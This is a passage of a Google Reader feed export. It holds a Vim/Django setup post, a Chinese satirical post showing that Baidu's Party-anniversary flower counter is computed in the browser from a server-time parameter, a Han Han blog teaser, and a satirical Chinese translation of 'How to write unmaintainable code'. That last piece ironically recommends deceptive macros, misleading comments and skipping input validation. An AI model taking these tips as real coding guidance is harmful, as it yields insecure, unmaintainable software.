“sounds like” a Django file:</p>\n<div><pre><span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> admin.<span>py</span>     <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> urls.<span>py</span>      <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> models.<span>py</span>    <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> views.<span>py</span>     <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> settings.<span>py</span>  <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> forms.<span>py</span>     <span>setlocal</span> <span>filetype</span><span>=</span>python.django\n</pre></div>\n\n\n<h3>Python Sanity Checking</h3>\n<p>Lets be honest here: it takes a lot of work to turn Vim into an “<span><span>IDE</span></span>”, and even then\nit doesn’t reach the level of something like Eclipse for Java.  Anyone who claims it\nhas the same levels of integration and functionality is simply lying.</p>\n<p>With that said I’ll make an opinionated statement that is going to piss some of you off.</p>\n<p><strong>I am a programmer, not an <span><span>IDE</span></span> operator.</strong></p>\n<p>I know Python.</p>\n<p>I know Django.</p>\n<p>I don’t need to hit Cmd+Space twice for every line of code I write.</p>\n<p>When someone asks me “how do you run your site” I do <strong>not</strong> answer: “click the green\ntriangle in Eclipse”.</p>\n<p>However, I am human.  I do stupid things like forgetting a colon or forgetting an\nimport.  To help me with those problems I’ve turned to <a href=\"http://www.vim.org/scripts/script.php?script_id=2736\">Syntastic</a> and Kevin\nWatters’ <a href=\"https://github.com/kevinw/pyflakes\">Pyflakes fork</a> for Vim.</p>\n<p>Syntastic is a Vim plugin that adds on-the-fly syntax-checking for many different\nfile formats.  If you have Pyflakes installed it will automatically show you errors\nin your code.</p>\n<p>Pyflakes doesn’t have <span><span>IDE</span></span>-level integration with your code.  It doesn’t check that\nwhatever libraries you <code>import</code> actually exist.  It simply checks that your files are\nprobably-valid Python, and tells you when they’re not.</p>\n<p>This is enough for me.  It catches the stupid mistakes I make.  The less-stupid,\nmore-subtle mistakes slip by it, but to be fair many of them would have slipped by an\n“<span><span>IDE</span></span>” as well.</p>\n<h3>Javascript Sanity Checking and Folding</h3>\n<p>Syntastic also supports Javascript if you have Javascript Lint installed (<code>brew\ninstall jsl</code> on <span><span>OS</span></span> X).  It’s not perfect but it <em>will</em> catch things like using\ntrailing commas in object literals.</p>\n<p>Some people like using CTags to get an overview of their code.  I take a more\nlow-tech approach and am in love with code folding.  When I fold my code\nI automatically get an overview of everything in each file.</p>\n<p>By default Vim doesn’t fold Javascript files, but you can add some basic, perfectly\nserviceable folding with these two lines in your .vimrc:</p>\n<div><pre><span>au</span> <span>FileType</span> javascript <span>setlocal</span> <span>foldmethod</span><span>=</span>marker\n<span>au</span> <span>FileType</span> javascript <span>setlocal</span> <span>foldmarker</span><span>=</span>{<span>,</span>}\n</pre></div>\n\n\n<h3>Django Autocommands</h3>\n<p>I <em>rarely</em> work with raw <span><span>HTML</span></span> files any more.  Whenever I open a file ending in\n<code>.html</code> it’s almost always a Django template (or a <a href=\"http://jinja.pocoo.org/\">Jinja</a> template, which has\na very similar syntax).  I’ve added an autocommand to automatically set the correct\nfiletype whenever I open a <code>.html</code> file:</p>\n<div><pre><span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> *.html <span>setlocal</span> <span>filetype</span><span>=</span>htmldjango\n</pre></div>\n\n\n<p>I also have some autocommands that tweak how a few specific files are handled:</p>\n<div><pre><span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> urls.<span>py</span>      <span>setlocal</span> <span>nowrap</span>\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> settings.<span>py</span>  normal<span>!</span> zR\n<span>au</span> <span>BufNewFile</span><span>,</span><span>BufRead</span> dashboard.<span>py</span> normal<span>!</span> zR\n</pre></div>\n\n\n<p>This automatically unfolds <code>urls.py</code>, <code>dashboard.py</code> and <code>settings.py</code> (I prefer\nseeing those unfolded) and unsets line wrapping for <code>urls.py</code> (lines in a <code>urls.py</code>\nfile can get long and are hard to read when wrapped).</p>\n<h2>Conclusion</h2>\n<p>I hope that this longer-than-expected blog entry has given you at least one or two\nthings to think about.</p>\n<p>I’ve learned a lot while working with Django for Dumbwaiter every day, but I’m sure\nthere’s still a lot I’ve missed.  If you see something I could be doing better please\nlet me know!</p>\n                \n            \n                    \n                <img src=\"http://feeds.feedburner.com/~r/stevelosh/~4/3yBaI0DYSWc\" height=\"1\" width=\"1\">"
    },
    "author" : "Steve Losh",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/stevelosh",
      "title" : "Steve Losh",
      "htmlUrl" : "http://stevelosh.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1310623753363",
    "timestampUsec" : "1310623753363215",
    "id" : "tag:google.com,2005:reader/item/3604a33106ff2143",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "文字", "yy" ],
    "title" : "技术贴：《什么叫意淫！？》",
    "published" : 1309144707,
    "updated" : 1309144707,
    "alternate" : [ {
      "href" : "http://fun4hi.com/8779",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>无法分享的话，请问有关部门。</p><p>人类已经无法阻止百度的媚谄了。如果你以为我单指在百度里面输入“建党”就会看见的红旗赞歌的话，你就大错特错了。</p><p>本来这种媚上的传统也算是几千年文化的一部分了，无需大惊小怪，发这样的状态，估计只会被认为是抓住一切机会讥讽社会主义伟大建设的行为，所以我看见梅姐也同瞎就很开心地继续复习了，但是师傅说他献了整整10束花才发现没有献花上限，令我心里陡然一动。</p><p>原因很简单，红旗赞歌上面只有镶死的八位数字，最多“接受”一亿减一束花，现在已经“献”了一百五十多万束，难道百度没考虑过爱党甚于爱己的全集减一小撮中国人会献花献到爆肛溢出吗！？这很可能的啊！难道百度没考虑过一小撮中国人会发起攻击就是让它溢出让百度不好看吗？<br> <span></span><br> 于是我踏上了寻觅真相的道路。准确来说，我以一小撮人的身份自比开始研究攻击计数器的可能性（当然一个人在剩下五天里发起一亿条请求是不可能的）。要攻击计数器，首先要找到服务器接受献花的API。既然红旗赞歌封装在一个低效臃肿的flash里面，我就用Chrome来监听沙盒请求。当我摁下“我也送一束”的按钮的时候，我看着events列表，我简直无法相信我的眼睛！因为：</p><p> 没有事发生。</p><p>准确来说，flash向百度服务器只做了一个GET请求，请求了“一盆花”……</p><p>http://open.baidu.com/stat/jiandang/images/flowers/00.png</p><p>没错！就是那盆你献完花之后它反献给你的一盘类似寿桃的东西。所谓我祝党万岁，党让我活着即为此意。看到此监听结果，我当时就有不祥预感，那就是大家献的花其实根本就没发到百度的服务器上面。大家刷刷地献，计数器也刷刷地增加，但其实都只发生在这个红旗赞歌flash里面，全献给了你的CPU。百度只是为大家按捺已久的澎湃激情提供了一个自我内部消化的平台（没错，红旗赞歌架设在百度开放平台上面）。用简单的言语来描述，那就是意淫。</p><p>不过，我是个严谨的人，尽管我很喜欢，但我尽量不去主动污蔑百度这个下流无耻手段恶作的贱货废渣。从技术上来说，百度确实可以通过计算“一盘寿桃”被请求的次数来算出大家献花的束数，所以我继续探寻真相。要验证这个假设的真实性，就必须把flash下载下来放在本地运行。没想到百度奸诈得用js动态加载flash，但是这难不倒我，我终于找到生成flash URL的语句。看着这条语句，我觉得我的不祥预感已经真实了九成了，因为这条语句是：</p><p>G(“op_flash_iframe”).src=”http:\\/\\/open.baidu.com\\/stat\\/jiandang\\/flash.html?city=”+encodeURIComponent(“”)+”&amp;serverTime=”+bdServerTime*1000+”&amp;t=”+Math.random();</p><p>绿色字提供的是城市名，我不在中国故是空；蓝色字是一个本地产生的(0,1)随机数；关键的红色字是什么呢，它是服务器时间的UTC值！简单来说就是1970年1月1日0时0分0秒以来地球表面（格林威治时间）经过了的毫秒数。我于是把返回的UTC值往前调了一个小时（3600000毫秒），红旗赞歌上面的鲜花数神奇地下降了64800束。于是这简单直接地证明了，serverTime是计算鲜花数的一个参数。我于是做了一系列的黑盒实验，终于确定：只要UTC处于[1308520800000,1309471200000)之间，也就是6月20日0时整点和7月1日0时整点（但不包括）之间，鲜花数就是UTC的一个线性函数：</p><p>鲜花数=(UTC-1308520800000)/1000*18</p><p>也就是说，无论有没有人献花，鲜花数都会以每秒18束的速度递增。不相信的可以点击这个地址：http://open.baidu.com/stat/jiandang/flash.html?city=&amp;serverTime=1308499200000&amp;t=0，UTC时间是6月20日零时（北京时间），你会看见00000000束鲜花。而通过简单计算就可以得出，党生日的那天，网民们将“献”了几乎17107200束花。</p><p>对此我已经彻底无语。一想到这事情我眼前就浮现出那种对我党无比热爱的同学，虔诚地点下献花的按钮，看着屏幕上的+1，只觉党收到了自己的祝福，满心喜悦，心潮澎湃，对党的忠诚又再坚定了几分。而事实上，一切都发生在他们的幻觉里。他们的献花，甚至都没有离开他们的电脑。如今中国一台台的晚会，一场场的盛宴，无不是集体的意淫，蓄意的愚民，发起者的“政绩”，向当权者的媚谄，百度的所作所为，徒增一笔丑色而已。可是你想，完全是无用功的献花，完全是恣意定下的数字，最后必将成为百度公关的重要筹码，人民网之流的正面新闻，成亿上兆的五毛马甲歌功颂德的又一“有力”论据。这次仅仅是因为是发生在技术自由的互联网上，而且白痴的程序员将服务器时间当成外部参数又送回到服务器上面，否则我们根本无从揭穿这场闹剧。可是其他领域呢？GDP、基尼系数、贷款总额、军费、维稳费用、贪污数额、社保亏空、“群体事件”死人数目、大坝排水道校舍能抵御N年一遇灾害的N，林林种种的统计数字，有哪个我们有API验证？所以你可以想象跟五毛争论时，我看见他们抛出的一个个掷地有声的统计数字，以杀戮的姿态无视真相，神情还洋洋自得，我脸上能有多抽搐。能有多抽搐！！！</p><p>==============================================</p><p>这个第二部分不用想都知道是什么了，既然计数器是假的，我们很有理由相信下面的网友<a href=\"http://fun4hi.com/guestbook\" title=\"我要留言\">留言</a>也是假的。所以我监听得再多些，发现flash请求了这个文件：</p><p>http://open.baidu.com/stat/jiandang/xml/data.xml</p><p>这个文件的内容写成人类易读的格式就是：</p><p> <em>我作为一名公民，为生活在这个时刻，为生活在共产党领导下的社会主义国家而感到自豪，荣幸。我作为一名年轻的共产主义事业的接班人，更有一种匹夫有责的使命感。任重而道远，我将在中国共产党的领导下，不断前进，为人民为社会做出一份贡献。中国共产党你是一盏明灯，永远驻留在我心中，指引我坚定不移的做一名共产主义忠实的追随者。2011-06-20#司懂懂</em></p><p>伟大的党走过90的光辉历程，我衷心地祝福她明天更辉煌、更强大。 2011-06-20#李建海</p><p>我是一名预备党员，我深深地为我们党在90年里所作出的巨大成就感到自豪！虽然你还有很多不完善的地方需要改进，但我坚信，你会领导人民走向更美好的明天！中国加油！中国共产党加油！2011-06-20#cindy</p><p>中国共产党是工人阶级的先锋队，同时也是中国人民和中华民族的先锋队，是中国特色社会主义的领导核心，始终代表中国先进生产力的发展要求，代表先进文化的前进方向，代表中国最广大人民的根本利益。2011-06-20#齐海彬</p><p>九十年历尽沧桑，九十年叱咤风云； 九十年辉煌行程，九十年名扬； 为了民族之独立， 为了人民之解放；您历尽曲折，您饱尝磨难。2011-06-20#邓国望</p><p>祝福中国，党走过90年的光辉历程，没有中国共产党，就没有新中国，只有中国共产党，才能发展中国! 2011-06-20#网友</p><p>光辉历程——颂歌献给伟大的党：一、南湖红船启风帆，开天辟地谱新篇。神州诞生共产党，漫漫长夜曙光现。2011-06-20#董彦明</p><p>光辉历程——颂歌献给伟大的党：二、工农割据靠武装，土地革命分田忙。创建赤色根据地，大刀长矛势力壮。2011-06-21#董彦明</p><p>90年前，在中国人民为改变民族命运如火如荼的斗争中，中国共产党应运而生。90年来，中国共产党团结带领全国各族人民前赴后继、顽强拼搏，建立了新中国，进行了社会主义革命和建设，实行改革开放，成功开辟了中国特色社会主义道路，为中华民族伟大复兴打开了前所未有的光明前景。祝党生日快乐~~~2011-06-21#小侯</p><p>投身基层党建，建设美好家园，祝福伟大祖国，铸就辉煌业绩！ 2011-06-21#姜燕玲</p><p>九十年风雨兼程，从胜利走向胜利，我是党员我自豪，我是国人我骄傲。 2011-06-21#程楚</p><p>祝愿我们党万年长青！祝贺我们党生日！这是次很好的活动，再次让我对党史加深记忆。 2011-06-21#白桦</p><p>祝愿我们党生日快乐、永葆生机。 2011-06-21#史乃明</p><p>共产党好样的，这些年在你们的领导下，中国发生了翻天覆地的变化，经济得到了巨大发展，我国在国际上的地位逐渐提升……永远顶你！！！2011-06-21#王君波</p><p>以高昂的姿态、高涨的热情、高度的责任感和高尚的思想追求，迎接建党90周年！ 2011-06-21#王颖</p><p>井冈山的扁担，担起了全国解放的重任。 走过了长征两万五，走过了风雨多少载。 金沙江在为您歌唱；大渡河在为您呐喊； 大雪山在为您献花；茫茫大草地也为您铺上了绿色的地毯 ! 延安窑洞里的灯光，依旧散发光芒， 闪闪的红星，照亮了中国的未来。2011-06-21#韩佩佩</p><p>90年风吹雨打，90年勇往直前，在人民心中，党是一颗太阳，永不落！ 2011-06-21#许福平</p><p>谁能担当起领导中华民族实现伟大复兴的重任,谁是中国巨轮乘风破浪、驶向复兴彼岸的领航者?历史给出了答案,人民作出了选择。我们迎接纪念建党90周年,就是要从90年艰辛而辉煌的奋斗历程中汲取力量、坚定信念,在党的领导下励精图治、开拓奋进,把中国特色社会主义事业不断推向前进！作为祖国年轻的一代，作为年轻的共产主义战士，我们要用青春洋溢的激情为百年民族复兴之路掀开华丽的篇章！2011-06-21#李明月</p><p>中国共产党是一个伟大的党，九十周年，弹指一挥间，但是，她带领中国人民取得了举世瞩目的成绩，国家富强了，人民过上了幸福的生活。我们要发扬我党光荣传统，努力工作，为建设具有中国特色的社会主义贡献出自己微薄的力量。2011-06-21#丁吉生</p><p>共产党好样的，这些年在你们的领导下，中国发生了翻天覆地的变化，经济得到了巨大发展，我国在国际上的地位逐渐提升……永远顶你！！！2011-06-21#王君波</p><p>作为一名大学生预备党员，我为党的90岁生日高兴，同时也告诉自己要树立远大理想，刻苦学习，为中华民族的伟大复兴和广大人民的幸福生活贡献自己的一份力量！2011-06-21#李剑梅</p><p>值党成立90周年之际，以一名老党员身份：祝我们的组织“生日快乐”！ 2011-06-21#一张</p><p>正值建党90周年之际，学习党史，缅怀先烈，珍惜时光，感恩祖国，使我们必须做的。也是所有人应该做的！2011-06-21#学农</p><p>庆祝中国共产党90华诞！回顾党的发展历史，牢记党的宗旨和使命！把中国特色社会主义建设好 2011-06-21#网友</p><p>纪念中国共产党成立90周年，祝贺中华复兴，落实科学发展观，早日实现四个现代化！ 2011-06-21#陈启尤</p><p>是中国共产党在危机关头挽救了中国！拯救了生活在水生火热中的人民！没有党就不会有我们现在的幸福生活！2011-06-21#邓莹</p><p>值此建党九十周年之际，我仅以一个中华人民共和国公民和一个当代大学生的身份祝伟大的中国共产党万岁，祝伟大的中国人民万岁！2011-06-21#尹超</p><p>希望我们的党永远保持生机与活力；伟大的中国共产党万岁；伟大的中国人民万岁！ 2011-06-21#尹振涛</p><p>中国共产党是一个伟大的党,是一个人民信赖的党.我们年青一代要牢记党的历史,在知己的平凡岗位上怒力工作,以实际行动报答党的恩情.2011-06-21#谢芳菁</p><p>作为当代全球最大、领导着全球人口最多的国家的政党，在漫长的90年和纷繁复杂的国内国际环境中，通过一代又一代中国共产党人坚苦卓绝、顽强进取的不懈奋斗，创造了一个又一个从无到有、从小到大、从弱到强的丰功伟绩！令世界瞩目！先烈含笑！先辈欣慰！党员自豪！国人骄傲！在党的90华诞即将到来之际，深深地祝福您——中国共产党！2011-06-21#黄杰</p><p>重温党的90年的光辉历程，更加坚信一个道理：只有中国共产党，才能救中国；只有中国共产党才能发展中国；只有中国共产党，才能实现中华民族的伟大复兴！2011-06-21#网友</p><p>没有共产党，就没有新中国；没有共产党，就没有中华民族的复兴。历史没有停步，征程仍在继续。 2011-06-21#冯海文</p><p>中国共产党也是在领导中国人民的发展道路上，不断的解放、发展和完善自我的。保持共产党员先进性教育的开展，让我更加深切感受到，我们党是一个成熟的、先进的、充满活力的政党。实现中华民族的伟大复兴，唯有靠中国共产党。2011-06-21#孙祖玉</p><p>作为一名共产党员我时刻记得党的使命，把党的宗旨记在心上，时刻为共产党的事业而奋斗！ 2011-06-21#网友</p><p>庆祝中国共产党90华诞！回顾党的发展历史，牢记党的宗旨和使命！把中国特色社会主义建设好！ 2011-06-21#网友</p><p>正值建党90周年之际，学习党史，缅怀先烈，珍惜时光，感恩祖国，使我们必须做的。也是所有人应该做的！2011-06-21#学农</p><p>中国共产党自1921年成立至今已经九十年了，一部中共党史就是一部中华民族从屈辱走向独立解放与富强的历史。我们为有这样一个伟大的政党感到骄傲，我们能有今天的美好生活，能有民族的复兴与中华的崛起必须感谢她。我觉得作为一个中国人应该对中国共产党有大的了解，我认为这样的党史知识竞赛很有必要，让人们重温中国共产党的光辉历史，让人们继承与发扬前辈们的革命与爱国精神。熟知中共党史也是在让人们了解过去，珍惜今天来自不易的和平与繁荣，珍惜今天的民族兴旺与发达。历史也在昭示我们，唯有坚持中国共产党的领导才能真正的实现中华民族的伟大复兴，才能使人们过上幸福美满有尊严的生活。共产主义社会是我们党的最终理想，也是人类的最高理想，不管前面有多大的艰辛，党都会带领我们永往直前的。真的很感激也很庆幸我们中华民族有这样一股中坚力量，全人类也同样感激与庆幸，光明的前景在等待着我们。让我们共同努力为实现中华民族的伟大复兴与共产主义而奋勇前进！2011-06-21#网友</p><p>我党在艰苦的岁月中，跋涉前行，终于战胜了黑暗，迎来了伟大的新中国，解放了全中国，解放了全人类；改革开放30年来，我们取得了举世瞩目的成绩，人民生活质量不断提高，国际地位不断提升，影响力不断扩大，这都得益于我们党正确而坚强的领导，我将一如既往的坚定跟着党走的信念，为建设全面小康社会做出自己的一份贡献。中国共产党万岁！中国人民万岁！2011-06-21#刘进</p><p>对于一个国家，需要富强与自立，中国共产党用90年做到了；对于人民，需要幸福与民主，中国共产党人用行动做到了。这是了不起的事。我相信我们伟大的党继续克服困难，带领人民在民族复兴、国家富强的道路上越走越好！2011-06-21#丘森才</p><p>热烈庆祝建党90周年！深切缅怀为了中国人民解放事业和中华民族伟大复兴英勇奋斗以致光荣献身的革命先烈！2011-06-21#网友</p><p>flash读取了这个数据文件之后就会循环“播放”，只要你有足够的耐心，你就能看到底。读完了这些歌功颂德的话，我深深地被百度的文案折服了，有这样的生花妙笔已属不易，而且换身份，换心情，换角度，换措辞，真是连曹雪芹和托尔斯泰这些塑造了无数栩栩如生的人物的文学大师都须甘拜下风！</p><p>只可惜美中不足的是网友到第三天就不再留言了，今天已是26号，是不是这几天他们的爱党之情如此之激昂，热泪盈眶，激动得连话都说不完整字都打不出，只得一遍遍地点献花按钮？真是引人遐想！</p><p><img src=\"http://shop.artxun.com/temp/thumb/7c/5b/7c5b13acb7610b46d1b32e588d5fe932405145.jpg\" alt=\"\"></p>"
    },
    "author" : "天朝小编",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://fun4hi.com/feed",
      "title" : "天朝娱乐 | 每天开心一下！",
      "htmlUrl" : "http://fun4hi.com"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307174312427",
    "timestampUsec" : "1307174312427080",
    "id" : "tag:google.com,2005:reader/item/e7423fffc72717e7",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "游戏指南",
    "published" : 1306512465,
    "updated" : 1306512465,
    "alternate" : [ {
      "href" : "http://blog.sina.com.cn/s/blog_4701280b010183ny.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "这是一个复杂的国度，人们并不是那么渴望文人范畴里的自由，如果你上街问问，大家都觉得自己过的挺自由。人们已经习惯了在台上台下的两种话语，你只要不冲进他......<a href=\"http://blog.sina.com.cn/s/blog_4701280b010183ny.html\">&gt;&gt;点击查看新浪博客原文</a>"
    },
    "author" : "韩寒",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://blog.sina.com.cn/rss/twocold.xml",
      "title" : "韩寒",
      "htmlUrl" : "http://blog.sina.com.cn/twocold"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1307173430322",
    "timestampUsec" : "1307173430322543",
    "id" : "tag:google.com,2005:reader/item/1af9a63ec13aab48",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "C/C++语言", "技术读物", "编程语言", "轶事趣闻", "C++", "Java" ],
    "title" : "如何写出无法维护的代码",
    "published" : 1307062362,
    "updated" : 1307062362,
    "alternate" : [ {
      "href" : "http://coolshell.cn/articles/4758.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>酷壳里有很多我觉得很不错的文章，但是访问量最大的却是那篇《<a title=\"6个变态的C语言Hello World程序\" href=\"http://coolshell.cn/articles/914.html\">6个变态的Hello World</a>》，和它能在本站右边栏“<strong>全站热门</strong>”中出现的还有“<a title=\"如何加密/混乱C源代码\" href=\"http://coolshell.cn/articles/933.html\">如何加密源代码</a>”，以及<a title=\"编程真难啊\" href=\"http://coolshell.cn/articles/1391.html\">编程真难啊</a>等这样的文章。可见本站的读者们的偏好，我也相信你们都是“身怀绝技”的程序员。所以，今天给大家推荐这篇文章，相信一定能触动大家的兴奋点。</p>\n<p>这篇文章的原文在这里（<a href=\"http://mindprod.com/jgloss/unmain.html\">http://mindprod.com/jgloss/unmain.html</a>），我看完后我想说——</p>\n<ol>\n<li><strong>什么叫“创造力”，创造力就是——就算是要干一件烂事都能干得那么漂亮那么有创意的能力。</strong></li>\n<li><strong>什么叫“抓狂”，抓狂就是——以一种沉着老练的不屈不挠的一本正经的精神一点一点把你推向崩溃的边缘</strong>。</li>\n</ol>\n<p>我把文章节选了一些，也并没有完全翻译，简译一下，也加入了一些自己的调侃。对于有下面这些编程习惯的朋友，请大家对号入座。另外，维护程序的朋友们，你们死定了！！</p>\n<blockquote><p><img src=\"http://mindprod.com/image/icon64/woodpecker.png\" border=\"0\" alt=\"woodpecker\" width=\"64\" height=\"64\" align=\"left\">If builders built buildings the way programmers write programs, then the first woodpecker that came along would destroy civilization. （如果建筑师盖房子就像程序员写程序一样，那么，第一只到来的啄木鸟就能毁掉我们的文明）</p>\n<p>~ Gerald Weinberg (born: 1933-10-27 age: 77) <a href=\"http://www.geraldmweinberg.com/Site/Home.html\">Weinberg’s Second Law</a></p></blockquote>\n<h4>程序命名</h4>\n<ul>\n<li><strong>容易输入的名字</strong>。比如：Fred，asdf</li>\n<li><strong>单字母的变量名</strong>。比如：a,b,c, x,y,z（陈皓注：如果不够用，可以考虑a1,a2,a3,a4,….）</li>\n<li><strong>有创意地拼写错误</strong>。比如：SetPintleOpening， SetPintalClosing。这样可以让人很难搜索代码。</li>\n<li><strong>抽象</strong>。比如：ProcessData, DoIt, GetData… 抽象到就跟什么都没说一样。</li>\n<li><strong>缩写</strong>。比如：WTF，RTFSC …… （陈皓注：使用拼音缩写也同样给力，比如： BT，TMD，TJJTDS）</li>\n<li><strong>随机大写字母</strong>。比如：gEtnuMbER..</li>\n<li><strong>重用命名</strong>。在内嵌的语句块中使用相同的变量名有奇效。</li>\n<li><strong>使用重音字母</strong>。比如：int  ínt（注：第二个 ínt不是int）</li>\n<li><strong>使用下划线</strong>。比如：_, __, ___。</li>\n<li><strong>使用不同的语言</strong>。比如混用英语，德语，或是中文拼音。</li>\n<li><strong>使用字符命名</strong>。比如：slash, asterix, comma…</li>\n<li><strong>使用无关的单词</strong>。比如：god, superman, iloveu….</li>\n<li><strong>混淆l和1</strong>。字母l和数字1有时候是看不出来的。</li>\n</ul>\n<h4><span></span>伪装欺诈</h4>\n<ul>\n<li><strong>把注释和代码交织在一起</strong>。</li>\n</ul>\n<pre>for(j=0; j&lt;array_len; j+ =8)\n{\n    total += array[j+0 ];\n    total += array[j+1 ];\n    total += array[j+2 ]; /* Main body of\n    total += array[j+3]; * loop is unrolled\n    total += array[j+4]; * for greater speed.\n    total += array[j+5]; */\n    total += array[j+6 ];\n    total += array[j+7 ];\n}</pre>\n<ul>\n<li><strong>隐藏宏定义</strong>。如：#define a=b a=0-b，当人们看到a=b时，谁也想不到那是一个宏。</li>\n</ul>\n<ul>\n<li><strong>换行</strong>。如下所示，下面的示例使用搜索xy_z变得困难。</li>\n</ul>\n<pre>#define local_var xy\\\n_z // local_var OK</pre>\n<ul>\n<li><strong>代码和显示不一致</strong>。比如，你的界面显示叫postal code，但是代码里确叫 zipcode.</li>\n</ul>\n<ul>\n<li><strong>隐藏全局变量</strong>。把使用全局变量以函数参数的方式传递给函数，这样可以让人觉得那个变量不是全局变量。</li>\n</ul>\n<ul>\n<li><strong>使用同意词</strong>。如：</li>\n</ul>\n<pre>#define xxx global_var // in file std.h&amp;nbsp;\n#define xy_z xxx // in file ..\\other\\substd.h&amp;nbsp;\n#define local_var xy_z // in file ..\\codestd\\inst.h</pre>\n<ul>\n<li><strong>使用相似的变量名</strong>。如：单词相似，swimmer 和 swimner，字母相似：ilI1| 或 oO08。parselnt 和 parseInt， D0Calc 和 DOCalc。还有这一组：xy_Z, xy__z, _xy_z, _xyz, XY_Z, xY_z, Xy_z。</li>\n</ul>\n<ul>\n<li><strong>重载函数</strong>。使用相同的函数名，但是其功能和具体实现完全没有关系。</li>\n</ul>\n<ul>\n<li><strong>操作符重载</strong>。重载操作符可以让你的代码变得诡异，感谢CCTV，感谢C++。这个东西是可以把混乱代码提高到一种艺术的形式。比如：重载一个类的 ! 操作符，但实际功能并不是取反，让其返回一个整数。于是，如果你使用 ! ! 操作符，那么，有意思的事就发生了—— 先是调用类的重载 ! 操作符，然后把其返回的整数给 ! 成了 布尔变量，如果是 !!! 呢？呵呵。</li>\n</ul>\n<ul>\n<li><strong>#define</strong>。看过本站那些混乱代码的文章，你都会知道宏定义和预编译对于写出不可读的代码的重大意义。不过，一个具有想像力的东西是——在头文件中使用预编译来查看这个头文件被include了几次，而被include不同的次数时，其中的函数定义完全不一样。</li>\n</ul>\n<pre>#ifndef DONE\n#ifdef TWICE\n// put stuff here to declare 3rd time around\nvoid g(char* str);\n#define DONE\n#else // TWICE\n#ifdef ONCE\n// put stuff here to declare 2nd time around&lt;\nvoid g(void* str);\n#define TWICE\n#else // ONCE\n// put stuff here to declare 1st time around\nvoid g(std::string str);\n#define ONCE\n#endif // ONCE\n#endif // TWICE\n#endif // DONE</pre>\n<h4>文档和注释</h4>\n<ul>\n<li><strong>在注释中撒谎</strong>。你不用真的去撒谎，只需在改代码的时候不要更新注释就可以了。</li>\n<li><strong>注释明显的东西</strong>。比如：/* add 1 to i */。（参看本站的“<a title=\"五种应该避免的代码注释\" href=\"http://coolshell.cn/articles/2746.html\">五种应该避免的注释</a>”）</li>\n<li><strong>只注释是什么，而不是为什么</strong>。</li>\n<li><strong>不要注释秘密</strong>。如果你开发一个航班系统，请你一定要保证每有一个新的航班被加入，就得要修改25个以上的位置的程序。千万别把这个事写在文档中。</li>\n<li><strong>注重细节</strong>。当你设计一个很复杂的算法的时候，你一定要把所有的详细细设计都写下来，没有100页不能罢休，段落要有5级以上，段落编号要有500个以上，例如：1.2.4.6.3.13 – Display all impacts for activity where selected mitigations can apply (short pseudocode omitted). 这样，当你写代码的时候，你就可以让你的代码和文档一致，如：Act1_2_4_6_3_13()</li>\n<li><strong>千万不要注释度衡单位</strong>。比如时间用的是秒还是毫秒，尺寸用的是像素还是英寸，大小是MB还是KB。等等。另外，在你的代码里，你可以混用不同的度衡单位，但也不要注释。</li>\n<li><strong>Gotchas</strong>。陷阱，千万不要注释代码中的陷阱。</li>\n<li><strong>在注释和文档中发泄不满</strong>。（参看本站的“<a title=\"五种应该避免的代码注释\" href=\"http://coolshell.cn/articles/2746.html\">五种应该避免的注释</a>”）</li>\n</ul>\n<h4>程序设计</h4>\n<ul>\n<li><strong>Java Casts</strong>。Java的类型转型是天赐之物。每一次当你从Collection里取到一个object的时候，你都需要把其转回原来的类型。因些，这些转型操作会出现在N多的地方。如果你改变了类型，那么你不一定能改变所有的地方。而编译器可能能检查到，也可能检查不到。</li>\n<li><strong>利用Java的冗余</strong>。比如：Bubblegum b = new Bubblegom(); 和 swimmer = swimner + 1; 注意变量间的细微差别。</li>\n<li><strong>从不验证</strong>。从不验证输入的数据，从不验证函数的返回值。这样做可以向大家展示你是多么的信任公司的设备和其它程序员。</li>\n<li><strong>不要封装</strong>。调用者需要知道被调用的所有的细节。</li>\n<li><strong>克隆和拷贝</strong>。为了效率，你要学会使用copy + paste。你几乎都不用理解别人的代码，你就可以高效地编程了。（陈皓注：Copy + Paste出来的代码bug多得不能再多）</li>\n<li><strong>巨大的listener</strong>。写一个listener，然后让你的所有的button类都使用这个listener，这样你可以在这个listener中整出一大堆if…else…语句，相当的刺激。</li>\n<li><strong>使用三维数组</strong>。如果你觉得三维还不足够，你可以试试四维。</li>\n<li><strong>混用</strong>。同时使用类的get/set方法和直接访问那个public变量。这样做的好处是可以极大的挫败维护人员。</li>\n<li><strong>包装，包装，包装</strong>。把你所有的API都包装上6到8遍，包装深度多达4层以上。然后包装出相似的功能。</li>\n<li><strong>没有秘密</strong>。把所有的成员都声明成public的。这样，你以后就很难限制其被人使用，而且这样可以和别的代码造成更多的耦合度，可以让你的代码存活得更久。</li>\n<li><strong>排列和阻碍</strong>。把drawRectangle(height, width) 改成 